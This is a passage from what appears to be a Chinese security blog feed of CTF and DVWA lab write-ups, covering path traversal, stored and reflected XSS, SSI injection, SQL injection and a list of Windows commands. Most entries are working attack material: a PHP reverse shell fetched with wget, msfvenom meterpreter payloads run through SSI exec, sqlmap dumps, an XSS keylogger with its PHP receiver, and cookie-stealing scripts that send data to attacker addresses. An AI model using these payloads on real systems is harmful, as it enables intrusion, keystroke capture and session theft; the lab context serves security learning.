    <url>%2F2019%2F10%2F11%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Background 路径遍历攻击（也称为目录遍历）旨在访问存储在Web根文件夹之外的文件和目录。通过槽中带有“点-斜线(..)” 序列及其变化的文件或使用绝对文件路径来应用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置或关键系统文件。 这种攻击也称为“点-点斜线”、 “目录遍历”、 “目录爬升” 和 “回溯” 。 实验环境攻击机 kali linux ： 10.0.2.15靶场机器 linux ： 10.0.2.12 信息探测先对靶场机器进行信息的收集扫描开放的端口或服务 nmap -sV 10.0.2.12 扫描开放80端口http服务下的文件 1root@kali:~# dirb http://10.0.2.12/ 发现疑似管理后台的页面 通过弱口令“admin”成功登陆后台 通过漏洞扫描器owasp-zap进行扫描 发现路径遍历漏洞 1http://10.0.2.12/view.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 漏洞利用此时，知道服务器存在路径遍历漏洞，而且通过弱口令进入后台想拿下该靶机的root权限，可以上传webshell，利用路径遍历执行webshell。 制作一个phpwebshell 123456root@kali:~# ls /usr/share/webshells/php/findsock.c php-findsock-shell.php qsd-php-backdoor.phpphp-backdoor.php php-reverse-shell.php simple-backdoor.phproot@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php test/shell.phproot@kali:~# ls test/shell.php 设置shell脚本的IP和监听端口 利用管理后台创建一个shell.php的数据库（就是一个php后缀的文件） 创建完数据库，创建表和字段 选择字段类型为txt，默认值为一段php代码，代码如下 1&lt;?php system("cd /tmp;wget http://10.0.2.15/shell.php;chmod +x shell.php;php shell.php;") ?&gt; 代码的作用是通过system函数执行系统命令，下载一个webshell并用php执行。 所以需要仔kali搭建http服务端可以用python简易搭建 12root@kali:~/test# python -m &quot;SimpleHTTPServer&quot;Serving HTTP on 0.0.0.0 port 8000 ... 由于端口是8000，需要重新指定端口，重新创建一张表 使用nc进行监听1234端口 1234root@kali:~/test# nc -nvlp 1234Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234 利用目录遍历漏洞访问shell.php,应为是一个php文件，如果里面有php代码就会被解析执行 1http://10.0.2.12/view.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr/databases/shell.php 浏览器执行，卡顿后，返回监听端口查看这样就获取到靶机的www-data用户的权限]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[存储型XSS漏洞]]></title>
    <url>%2F2019%2F10%2F01%2F%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。 简介存储型xss和反射型xss利用起来并没有太大什么区别，不过存储型xss是一次注入，所有访问者包括管理员都会中招。这种情况常发生在网站的留言板页面上，以下给出一个例子。 漏洞利用这是一个留言板块，输入姓名和信息即可 如果我们输入的是恶意的JavaScript代码，那又会如何？ 1&lt;script&gt;alert('hello,XSS')&lt;/script&gt; 输入的js代码执行了，并且将js代码写进数据库或文件中，每次访问或刷新页面时，都会执行我们可以在页面的源代码中看到，它已经把输入的信息当脚本执行了 我们可以利用这个漏洞盗取访问该页面的任何人的cookie，甚至是管理员的将恶意的JavaScript代码写在本地服务器(攻击者的服务器)保存为get_cookies.js 12var img = Image();img.src = "http://10.0.2.15:4445/cookies.php?cookie="+document.cookie; 开启apache服务，在本地监听4445端口 12service apache2 start # 开启apache服务nc -vlp 4445 # 监听4445端口 将代码注入目标服务器中，有时候输入会有长度限制，可以手动更改它的js代码 获取cookie 源码分析low12345678910111213141516171819202122&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = stripslashes($message); $message = mysql_real_escape_string($message); // Sanitize name input $name = mysql_real_escape_string($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; trim移除字符串两侧的字符，默认为空字符 stripslashes该函数可用于清理从数据库中或者从 HTML 表单中取回的数据，去除反斜杠； mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 这几个函数并没有对xss攻击做有效的防护，所以基本不用绕过 medium123456789101112131415161718192021222324&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = trim(strip_tags(addslashes($message))); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = str_replace('&lt;script&gt;', '', $name); $name = mysql_real_escape_string($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。 htmlspecialchars 函数把预定义的字符转换为 HTML 实体。 str_replace() 字符串替换 message变量值经过多个函数进行数据清洗，比较难绕过，但是name变量值只经过str_replace和mysql_real_escape_string两个函数的过滤mysql_real_escape_string并没有什么作用，看str_replace函数即可，它将script标签替换成空字符，这其实很容易绕过 1&lt;scr&lt;script&gt;ipt&gt;alert('hello,xss')&lt;/script&gt; high12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['btnSign']))&#123; $message = trim($_POST['mtxMessage']); $name = trim($_POST['txtName']); // Sanitize message input $message = stripslashes($message); $message = mysql_real_escape_string($message); $message = htmlspecialchars($message); // Sanitize name input $name = stripslashes($name); $name = mysql_real_escape_string($name); $name = htmlspecialchars($name); $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');"; $result = mysql_query($query) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); &#125;?&gt; messages和name变量都做了完善的过滤，目前并没有发现可绕过的方法 注入的标签都会转成实体字符]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SSI注入]]></title>
    <url>%2F2019%2F09%2F29%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SSI%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Background SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 简介&emsp;&emsp;SSI常见于shtml页面中，shtml是标准通用标记语言下的一个应用，包含有嵌入式服务器方包含命令的文本，在被传送给浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改。&emsp;&emsp;shtml和asp 有一些相似，以shtml命名的文件里，使用了ssi的一些指令，就像asp中的指令，你可以在SHTML文件中写入SSI指令，当客户端访问这些shtml文件时，服务器端会把这些SHTML文件进行读取和解释，把SHTML文件中包含的SSI指令解释出来。 主要用途 显示服务器端环境变量&lt;#echo&gt; 12345本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt; 将文本内容直接插入到文档中&lt;#include&gt; 1234567&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等) 123文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt; 直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) 1234567&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt; 设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI可设置变量使用if条件语句。 注入命令参考：(https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection) 靶场实例攻击者：192.168.43.44靶机：192.168.43.64 信息收集nmap -sV 192.168.43.64 扫描该靶机开放的服务扫描到靶机开放了http服务 浏览器访问该站点 dirb、nikto扫描网站目录文件 查看robots.txt访问/spukcab文件夹下载配置文件，并查看 发现网站根目录：/var/www/html/convert.me/public_html 查看index.shtml文件这可能是提示信息，用这条命令查看用户密码文件 漏洞发现在index.php页面有一个表单用于提交一个IP和反馈的意见(或信息)，并转递到receipt.php页面，并最终跳转到receipt.shtml 尝试输入提示的ssi命令 1&lt;--#exec cmd=&quot;cat /etc/passwd&quot; --&gt; 发现feedback参数值过滤了exec 转换大小写（这里其实ssi命令–前要加！） 1&lt;!--#EXEC cmd=&quot;cat /etc/passwd&quot; --&gt; 成功执行 漏洞利用上传webshell获取权限 先生成webshell，IP为攻击者IP 1root@kali:~# msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.43.44 lport=4444 -f raw &gt; test/shellcode.py msf启动监听 123456msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; show optionsmsf5 exploit(multi/handler) &gt; set lhost 192.168.43.44msf5 exploit(multi/handler) &gt; show options msf5 exploit(multi/handler) &gt; run 利用ssi注入漏洞让靶机下载shellcode 攻击者机器Kali开启apache服务，将shellcode.py拷贝到/var/www/html/ 12345root@kali:~# cp test/shellcode.py /var/www/html/root@kali:~# ls /var/www/html/hack.js index.html shellcode.py whoami.exeroot@kali:~# service apache2 startroot@kali:~# service apache2 status 靶机下载shellcode 1&lt;!--#EXEC cmd=&quot;wget http://192.168.43.44/shellcode.py&quot; --&gt; 提升shellcode.py可执行权限 1&lt;!--#EXEC cmd=&quot;chmod 777 shellcode.py&quot; --&gt; 运行shellcode脚本 1&lt;!--#EXEC cmd=&quot;python shellcode.py&quot; --&gt; 运行之后，返回msf查看监听的端口 发现已经成功连接靶机 查看系统信息 进入系统shell]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL注入实战-MySQL(手工注入)]]></title>
    <url>%2F2019%2F09%2F20%2F%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98-MySQL-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[Background 网站维护人员在WEB目录中放了一个可能存在漏洞的页面。安全工程师“墨者”负责对该页面进行安全测试，看是否存在安全漏洞影响网站及服务器的运行。 了解并熟练使用手工SQL注入； 了解MySQL的相关知识； 了解SQLMAP的使用及其tamper插件的使用； 了解base64编码及解码。 判断注入点打开页面链接 观察url 1http://219.153.49.228:43444/show.php?id=MQo= 发现id的参数值MQo=是通过base64编码的1;即，id参数发送给服务器的值是需要经过base64编码的 先对url进行简单的sql注入判断（base64编码） 1231 and 1 = 1 MSBhbmQgMSA9IDE= 正常显示1 and 1 = 2 MSBhbmQgMSA9IDI= 页面不显示 这样一来可以判断出该页面是存在sql注入的 我们可以通过手工注入，也可以通过工具自动化注入 手工注入先判断select语句中的列字段个数可以用ordre by语句 123451 order by 1 MSBvcmRlciBieSAx 正常1 order by 2 MSBvcmRlciBieSAy 正常1 order by 3 MSBvcmRlciBieSAz 不正常 判断出select语句中的列字段数为2个 构造语句 12http://219.153.49.228:43444/show.php?id=0 union select 1,2 （以下是编码后的参数）http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgMSwy “0”的作用是让前面报错，让后面联合查询的内容得以显示 接下来是查询数据库的相关信息（查询数据库名和版本信息） 12http://219.153.49.228:43444/show.php?id=0 union select database(),version() http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSx2ZXJzaW9uKCk= 查询到数据库名是test 查询数据库表名 1234http://219.153.49.228:43444/show.php?id=0 union select group_concat(table_name),null from information_schema.tables where table_schema =&apos;test&apos;http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLG51bGwgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9J3Rlc3Qn（语句也可写成0 union select table_name,null from information_schema.tables where table_schema =&apos;test&apos; limit 0,1） 查询出数据库表名data 查询test.data表中的列 1234http://219.153.49.228:43444/show.php?id=0 union select group_concat(column_name),null from information_schema.columns where table_schema =&apos;test&apos; and table_name=&apos;data&apos;http://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSxudWxsIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hID0ndGVzdCcgYW5kIHRhYmxlX25hbWU9J2RhdGEn 查询到列名id,title,main,thekey 通过数据库表名查询字段内容 12http://219.153.49.228:43444/show.php?id=0 union select main,thekey from test.datahttp://219.153.49.228:43444/show.php?id=MCB1bmlvbiBzZWxlY3QgbWFpbix0aGVrZXkgZnJvbSB0ZXN0LmRhdGE= sqlmap自动化注入先简单测试用tamper参数加载脚本 （脚本在sqlmap/tamper文件中） 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch 没有发现注入点，尝试提高扫描强度 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 发现注入点了，就直接进行爆库 爆数据库名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 --dbs 爆数据库表名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test --tables 爆列名 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test -T data --columns 爆字段内容 1sqlmap.py -u &quot;http://219.153.49.228:43444/show.php?id=MQo=&quot; --tamper=&quot;base64encode.py&quot; --batch --level 2 -D test -T data -C thekey --dump]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmd命令大全]]></title>
    <url>%2F2019%2F09%2F17%2Fcmd%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[网上收集一些windows 中的cmd命令 cmd命令大全（第一部分）1234winver---------检查Windows版本 wmimgmt.msc----打开windows管理体系结构(WMI)wupdmgr--------windows更新程序 wscript--------windows脚本宿主设置 write----------写字板 winmsd---------系统信息wiaacmgr-------扫描仪和照相机向导 winchat--------XP自带局域网聊天 cmd命令大全（第二部分） 12345mem.exe--------显示内存使用情况 Msconfig.exe---系统配置实用程序mplayer2-------简易widnows media player mspaint--------画图板mstsc----------远程桌面连接 mplayer2-------媒体播放机magnify--------放大镜实用程序 mmc------------打开控制台mobsync--------同步命令 cmd命令大全（第三部分）1234dxdiag---------检查DirectX信息 drwtsn32------ 系统医生devmgmt.msc--- 设备管理器 dfrg.msc-------磁盘碎片整理程序diskmgmt.msc---磁盘管理实用程序 dcomcnfg-------打开系统组件服务ddeshare-------打开DDE共享设置 dvdplay--------DVD播放器 cmd命令大全（第四部分）12345net stop messenger-----停止信使服务 net start messenger----开始信使服务notepad--------打开记事本 nslookup-------网络管理的工具向导ntbackup-------系统备份和还原 narrator-------屏幕“讲述人”ntmsmgr.msc----移动存储管理器 ntmsoprq.msc---移动存储管理员操作请求netstat -an----(TC)命令检查接口 cmd命令大全（第五部分）123456syncapp--------创建一个公文包 sysedit--------系统配置编辑器sigverif-------文件签名验证程序 sndrec32-------录音机shrpubw--------创建共享文件夹 secpol.msc-----本地安全策略syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码services.msc---本地服务设置 Sndvol32-------音量控制程序sfc.exe--------系统文件检查器 sfc /scannow---windows文件保护 cmd命令大全（第六部分）12345678tsshutdn-------60秒倒计时关机命令 tourstart------xp简介（安装完成后出现的漫游xp程序）taskmgr--------任务管理器 eventvwr-------事件查看器eudcedit-------造字程序 explorer-------打开资源管理器packager-------对象包装程序 perfmon.msc----计算机性能监测程序progman--------程序管理器 regedit.exe----注册表rsop.msc-------组策略结果集 regedt32-------注册表编辑器rononce -p ----15秒关机 regsvr32 /u *.dll----停止dll文件运行 regsvr32 /u zipfldr.dll------取消ZIP支持 cmd命令大全（第七部分）1234567891011cmd.exe--------CMD命令提示符 chkdsk.exe-----Chkdsk磁盘检查 certmgr.msc----证书管理实用程序 calc-----------启动计算器charmap--------启动字符映射表 cliconfg-------SQL SERVER 客户端网络实用程序 Clipbrd--------剪贴板查看器 conf-----------启动netmeetingcompmgmt.msc---计算机管理 cleanmgr-------垃圾整理ciadv.msc------索引服务程序 osk------------打开屏幕键盘 odbcad32-------ODBC数据源管理器 oobe/msoobe /a----检查XP是否激活lusrmgr.msc----本机用户和组 logoff---------注销命令iexpress-------木马捆绑工具，系统自带 Nslookup-------IP地址侦测器fsmgmt.msc-----共享文件夹管理器 utilman--------辅助工具管理器gpedit.msc-----组策略]]></content>
      <categories>
        <category>windows基础</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击-键盘记录器]]></title>
    <url>%2F2019%2F09%2F10%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%2F</url>
    <content type="text"><![CDATA[xss反射型漏洞利用-键盘记录器 xss漏洞原理：XSS跨站脚本攻击原理及常见攻击手段 键盘记录器 keylogger.js 1234567891011document.onkeypress = function(evt) &#123; evt = evt || window.event; key = String.fromCharCode(evt.charCode); if(key) &#123; var http = new XMLHttpRequest(); var param = encodeURI(key); http.open("POST","http://192.168.43.44/keylogger.php",true); http.setRequestHeader("Content-type","application/x-www-form-urlencoded"); http.send("key="+param); &#125;&#125; 该脚本是放在攻击者的机器中，让用户访问执行解析用的；用户执行了，在浏览器里键盘输入的字符就会发送到keylogger.php进行处理。下面就是keylogger.php的代码。 keylogger.php 1234567&lt;?php$key=$_POST['key'];$logfile="keylog.txt";$fp = fopen($logfile,"a");fwrite($fp,$key);fclose($fp);?&gt; 该php脚本是用来接受受害者用户返回的数据，即键盘输入的值，然后保存到keylog.txt文本中。所以可以事先创建keylog.txt文件总之我们我们需要准备三个文件 那么接下来就是构造有反射型xss漏洞网站的url链接，诱骗用户点击 1&lt;script src=http://192.168.43.44/keylogger.js&gt;&lt;/script&gt; 将上面的脚本插入到链接中 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.43.44%2Fkeylogger.js%3E%3C%2Fscript%3E# 实现的效果如下任意输入的字符都会被记录（在当前页面） 思路：诱骗用户点击url，点击之后获取攻击者的keylogger.js脚本并解析；解析之后，用户在该页面输入的任何字符会发送到keylogger.php页面进行处理，如果是登陆的站点页面，攻击者就可以轻松获得用户明文的用户名密码。 反射型xss源码分析low123456789101112131415 &lt;?phpif(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true;&#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . $_GET['name']; echo '&lt;/pre&gt;'; &#125;?&gt; 从源码来看，服务端没有对输入的数据做任何的处理就直接返回给用户，这样攻击者可以非常容易地注入恶意的javascript脚本； 1&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; medium123456789101112131415 &lt;?phpif(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true;&#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . str_replace('&lt;script&gt;', '', $_GET['name']); echo '&lt;/pre&gt;'; &#125;?&gt; 将安全等级提高到medium，代码中使用str_replace()函数，作用是将输入的数据中含有”&lt;script&gt;”的标签过滤掉； 然而这样的过滤没有什么用,只要替换字母大小写即可绕过，如”&lt;scRipt&gt;”、”&lt;ScrIpt&gt;”等。或在原本的标签中再插入同样的标签，如下: 1&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/script&gt; hign123456789101112131415 &lt;?php if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == '')&#123; $isempty = true; &#125; else &#123; echo '&lt;pre&gt;'; echo 'Hello ' . htmlspecialchars($_GET['name']); echo '&lt;/pre&gt;'; &#125;?&gt; 在高安全的代码中，使用了htmlspecialchars()对数据进行过滤清洗；htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。(这里实体的意思是：有些字符在html中有特殊含义，如&gt;或&lt; ,要想使用这些字符，就必须使用实体字符)预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 使用了这个函数，脚本中标签的小于号、大于号就会被转换为&amp;lt；和&amp;gt；,并在返回时让浏览器重新解析目前来说并没有好的方法能够绕过，可以说有效的防止了xss攻击。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击原理及常见攻击手段]]></title>
    <url>%2F2019%2F08%2F31%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%2F</url>
    <content type="text"><![CDATA[XSS（Cross Site Scripting）攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 原理&emsp;&emsp;XSS漏洞通常是由于程序代码不完善导致的，漏洞产生的危害是用户输入的数据引起的。用户在客户端输入的恶意代码，发送给服务器，服务器端并没有对其数据进行过滤或过滤不完善，而直接返回给用户的浏览器，浏览器就会解析并执行返回的恶意代码。比如一些论坛的留言板块就可能存在XSS漏洞，常见的程序代码就是JavaScript。一般攻击者利用该漏洞进行盗取cookie、或网站重定向等操作。 XSS漏洞类型 反射型 反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。 存储型 存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。 DOM型 使用场景 直接嵌入html： 1&lt;script&gt;alert('XSS')&lt;/script&gt; 元素标签事件： 1&lt;body onload=alert('XSS')&gt; 图片标签： 1&lt;img src="javascript:alert('XSS')"&gt; 其他标签： 1&lt;iframe&gt;, &lt;div&gt;, &lt;link&gt; DOM对象，篡改页面内容 漏洞PoC如下，用户输入名字，服务器会返回用户输入的数据 漏洞利用的条件 站点存在XSS漏洞 用户点击或浏览该站点的相关链接 简单的漏洞检验方法 1&lt;script&gt;alert('XSS')&lt;/script&gt; 如果服务器没有对数据进行一定的处理，而直接返回给用户浏览器，浏览器就会直接执行 【插入一条链接】 1&lt;a href=http://www.baidu.com/&gt;click&lt;/a&gt; 当用户点击就会跳转至百度页面 【插入一张图片】 1&lt;img src=http://192.168.43.1/a.jpg onerror=alert(&apos;XSS&apos;)&gt; 如果图片不存在，出现错误就执行函数alert 【重定向】 1&lt;script&gt;window.location=&apos;http://192.168.43.44/&apos;&lt;/script&gt; 如果攻击者将脚本嵌入url中，用户点击 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F192.168.43.44%2F%27%3C%2Fscript%3E# 攻击者用nc开启80端口的监听，就可以获得对方浏览器的信息 【iframe框架】 1&lt;iframe src=&apos;http://192.168.43.44/&apos; height=0 width=0&gt;&lt;/iframe&gt; 利用方法同上； 【盗取cookie】 123&lt;script&gt;new Image().src=&quot;http://192.168.43.44/a.php?output=&quot;+document.cookie;&lt;/script&gt;&lt;script&gt;window.location=&apos;http://192.168.43.44/a.php?output=&apos;+document.cookie;&lt;/script&gt; 构造一个url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F192.168.43.44%2Fa.php%3Foutput%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E# 只要用户点击该链接就可以获得用户浏览器的cookie 【篡改页面】 1&lt;script&gt;document.body.innerHTML="&lt;div style=visibility:visible&gt;&lt;h1&gt;&lt;hr/&gt;THE WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;";&lt;/script&gt; url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.body.innerHTML%3D%22%3Cdiv+style%3Dvisibility%3Avisible%3E%3Ch1%3E%3Chr%2F%3ETHE+WEBSITE+IS+UNDER+ATTACK%3C%2Fh1%3E%3C%2Fdiv%3E%22%3B%3C%2Fscript%3E# 如果js代码比较多，一般不会写在url中而是将js代码放在第三方服务器中，让用户访问时跳转到第三方获取js代码js代码其实也可以在攻击者的服务器中，但为了隐蔽性，会选择第三方服务器。例如攻击者将以下代码保存至hack.js文件中 12var img = new Image();img.src = "http://192.168.43.44:4444/cookies.php?cookie="+document.cookie; 该代码的作用是将cookie信息发送到攻击者服务器的4444端口开启apache服务利用代码： 1&lt;script src=http://192.168.43.44/hack.js&gt;&lt;/script&gt; 构造url： 1http://192.168.43.117/dvwa/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.43.44%2Fhack.js%3E%3C%2Fscript%3E# 用户点击，会向指定站点服务器获取js脚本，浏览器解析后会把cookies发送给攻击者]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS跨站脚本攻击</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF靶场训练-SQL注入（X-Forwarded-For注入）]]></title>
    <url>%2F2019%2F08%2F28%2FCTF%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83-SQL%E6%B3%A8%E5%85%A5%EF%BC%88X-Forwarded-For%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
